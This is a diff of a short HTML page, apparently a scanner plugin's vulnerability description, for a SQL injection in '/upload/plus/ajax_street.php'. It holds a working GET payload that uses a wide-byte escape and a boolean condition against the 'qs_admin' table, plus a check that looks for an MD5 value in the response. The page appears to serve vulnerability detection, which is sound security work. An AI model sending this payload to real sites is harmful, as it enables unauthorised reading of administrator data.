@@ -1,11 +1,7 @@
 <meta charset="UTF-8">
 <div>
     <h3>SQL注入 URL: </h3>
-    <ul>
-        <p>/upload/plus/ajax_street.php</p>
-    </ul>
-    <h3>GET-payload: </h3>
-        <code>?act=key&key=s%e9%8c%a6' or cast(ascii(substring((select md5(c) from qs_admin),1,1))=97 as signed) %23</code>
+    <code>http://example.com/upload/plus/ajax_street.php?act=key&key=s%e9%8c%a6' or cast(ascii(substring((select md5(c) from qs_admin),1,1))=97 as signed) %23</code>
     <h3>验证过程</h3>
-    <p>查看response text 是否含有"c"的md5值 "4a8a08f09d37b73795649038408b5f33"</p>
+    <p>查看返回页面源码中是否含有字符：4a8a08f09d37b73795649038408b5f33</p>
 </div>
